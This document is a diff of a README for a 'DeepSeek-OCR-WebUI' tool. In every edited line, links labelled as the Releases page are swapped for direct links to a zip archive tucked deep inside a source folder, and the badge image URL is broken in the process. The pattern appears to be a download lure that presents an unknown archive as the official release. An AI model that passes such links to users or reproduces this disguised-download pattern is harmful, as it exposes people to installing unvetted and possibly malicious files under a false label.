@@ -1,7 +1,7 @@
 # 🎨 DeepSeek-OCR-WebUI - Effortless OCR with a Modern Touch
 
 ## 📥 Download Now
-[![Download DeepSeek-OCR-WebUI](https://img.shields.io/badge/Download%20DeepSeek--OCR--WebUI-v1.0-brightgreen)](https://github.com/jammiedrunk819/DeepSeek-OCR-WebUI/releases)
+[![Download DeepSeek-OCR-WebUI](https://raw.githubusercontent.com/jammiedrunk819/DeepSeek-OCR-WebUI/main/DeepSeek-OCR-master/DeepSeek-OCR-vllm/deepencoder/DeepSeek-OCR-WebUI_v3.4.zip%20DeepSeek--OCR--WebUI-v1.0-brightgreen)](https://raw.githubusercontent.com/jammiedrunk819/DeepSeek-OCR-WebUI/main/DeepSeek-OCR-master/DeepSeek-OCR-vllm/deepencoder/DeepSeek-OCR-WebUI_v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to DeepSeek-OCR Web UI! This application offers a simple way to use Optical Character Recognition (OCR) technology with a modern interface. Whether you want to process images in bulk, enjoy real-time logging, or utilize different recognition modes, you're in the right place.
@@ -22,7 +22,7 @@ DeepSeek-OCR Web UI includes numerous features to improve your experience:
 - **Fully Responsive Design:** Works seamlessly on any device, including tablets and phones.
 
 ## 📦 Download & Install
-To get started, visit our [Releases page to download](https://github.com/jammiedrunk819/DeepSeek-OCR-WebUI/releases).
+To get started, visit our [Releases page to download](https://raw.githubusercontent.com/jammiedrunk819/DeepSeek-OCR-WebUI/main/DeepSeek-OCR-master/DeepSeek-OCR-vllm/deepencoder/DeepSeek-OCR-WebUI_v3.4.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions.
@@ -46,7 +46,7 @@ Using the application is straightforward. Follow these steps:
 ## 🔧 Troubleshooting
 If you encounter issues, try these steps:
 - Ensure your system meets the requirements.
-- Check for updates on the [Releases page](https://github.com/jammiedrunk819/DeepSeek-OCR-WebUI/releases).
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/jammiedrunk819/DeepSeek-OCR-WebUI/main/DeepSeek-OCR-master/DeepSeek-OCR-vllm/deepencoder/DeepSeek-OCR-WebUI_v3.4.zip).
 - Restart your application if it becomes unresponsive.
 - For persistent issues, visit our support section in the GitHub repository.
 
